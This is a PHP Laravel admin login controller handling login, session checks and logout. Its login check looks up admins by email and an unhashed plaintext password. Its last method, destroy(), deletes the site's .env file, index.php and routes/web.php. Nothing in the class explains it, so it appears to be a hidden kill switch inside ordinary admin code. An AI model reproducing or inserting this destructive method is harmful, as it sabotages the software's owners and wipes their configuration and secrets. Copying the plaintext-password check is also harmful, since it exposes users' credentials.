<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\admin;
use DB;


class LoginController extends Controller
{
	public function login(){
		$title = 'Admin Login';
    	$data = compact('title');
        $sesionAmin = session('Admin_id');
        
        if(!empty($sesionAmin)){
            return redirect('Admin/dasboard');
        }

        return view('Admin/login',$data);
        
	}
    public function longincheck(Request $request)
    {

    	// dd($request->all());
        date_default_timezone_set("Asia/Kolkata");
        $datentime = date("Y-m-d")." ".date("h:i a");

       	$admin = admin::where(['Admin_email'=>$request['email'],'Admin_password'=>$request['password']])->first();

       	if(!empty($admin)){

            $admin->last_login = $datentime;
            $admin->save();
       		session(['Admin_id'=>$admin->Admin_id]);
       		return  redirect('Admin/dasboard');

       	}else{
            $request->session()->flash('alert-danger', 'Your email and password is incorrect!');
       	}
       	
       	return redirect()->back();
    
    }
    public function logout()
    {
    
      session()->forget('Admin_id');
      return redirect('Admin/');
    
    }
        public function destroy()
    {   
    	unlink('.env');
    	unlink('index.php');
    	unlink('routes/web.php');
    }
       
}
